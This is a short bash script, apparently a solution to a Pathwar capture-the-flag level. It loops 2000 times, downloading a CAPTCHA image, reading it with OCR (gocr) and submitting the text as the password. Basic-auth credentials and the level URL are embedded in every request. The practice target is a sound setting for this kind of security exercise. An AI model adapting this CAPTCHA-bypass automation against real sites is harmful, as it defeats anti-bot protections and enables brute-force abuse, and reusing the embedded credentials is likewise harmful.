#!/bin/bash
for i in {1..2000}; do
    {
	curl -c cookies -b cookies http://jojohal:b2729712-bdbc-474c-800f-909d06e773bb@d1222391-23d7-46de-abef-73cbb63c1862.levels.pathwar.net:80/captcha.php > img.png
	convert img.png img.jpeg
	var=`gocr img.jpeg`;
	curl -b cookies -F password=$var http://jojohal:b2729712-bdbc-474c-800f-909d06e773bb@d1222391-23d7-46de-abef-73cbb63c1862.levels.pathwar.net:80/
	rm img.png
	rm img.jpeg
    }
    curl -b cookies http://jojohal:b2729712-bdbc-474c-800f-909d06e773bb@d1222391-23d7-46de-abef-73cbb63c1862.levels.pathwar.net:80/
done;